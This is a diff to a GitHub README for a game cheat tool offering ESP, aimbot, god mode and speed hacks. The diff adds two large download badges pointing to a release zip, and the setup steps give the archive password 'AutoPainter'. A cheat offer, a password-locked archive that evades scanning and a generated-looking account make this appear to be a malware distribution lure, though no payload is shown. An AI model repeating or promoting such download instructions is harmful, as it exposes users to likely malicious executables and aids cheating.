@@ -5,7 +5,7 @@ ESP · Aimbot · God Mode · Teleport · Speed Hack · Auto Paint
 
 <img width="1649" height="776" alt="menu-1" src="https://github.com/user-attachments/assets/9b3afe04-2b03-48d5-9985-432044407117" />
 
-
+<p align="center"><a href="https://github.com/chrisberg-code1992s6/Meccha-Auto-Painter/releases/tag/v1.0.0" style="text-decoration:none;"><img src="https://img.shields.io/badge/Download_Latest_version_(.zip)-181717?style=for-the-badge&logo=github&logoColor=white" alt="Download Latest version"></a></p>
 
 ---
 
@@ -52,7 +52,7 @@ ESP · Aimbot · God Mode · Teleport · Speed Hack · Auto Paint
 ---
 
 ## ⚙️ Installation
-
+[![](https://img.shields.io/badge/Download_Latest_Package_(.zip)-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/chrisberg-code1992s6/Meccha-Auto-Painter/releases/tag/v1.0.0)
 1. Click the download button above
 2. Extract the archive to a folder **PASSWORD "AutoPainter"**
 3. Done!
